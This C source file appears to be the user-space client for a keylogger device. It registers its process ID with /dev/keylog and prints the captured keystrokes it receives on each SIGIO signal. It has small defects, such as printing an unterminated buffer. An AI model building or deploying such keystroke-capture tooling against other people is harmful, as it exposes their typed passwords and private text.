#include <stdio.h>
#include <stdlib.h>
#include <sys/select.h>
#include <signal.h>

#define CONSOLE 0

FILE *fp;

void io_ready( int signum ) {
    printf( "Got signal %d\n", signum );
    
    char buffer[32];
    fread( buffer, 1, 32, fp );

    printf( "Reading %s from keylogger\n", buffer );
}

int main( int argv, char **argc ) {
    fd_set readset;
    int shouldExit = 0;

    fp = fopen( "/dev/keylog", "r+" );
    if ( fp == NULL ) {
        perror( "Failed to open keylog file" );
        return -1;
    }

    fprintf( fp, "%d", getpid() );
    fflush( fp );

    signal( SIGIO, io_ready ); // Register for IO signals

    FD_ZERO( &readset );
    
    while ( !shouldExit ) {
        FD_SET( CONSOLE, &readset );

        if ( select( 0 + 1, &readset, NULL, NULL, NULL ) != 0 ) {
            if ( FD_ISSET( CONSOLE, &readset ) ) {
                char c = getchar();
                if ( c == 'q' ) {
                    printf( "Exiting...\n" );
                    shouldExit=1;
                }
            }
        }
    }

    fprintf( fp, "%d", -1 );
    fclose( fp );

    return 0;
}
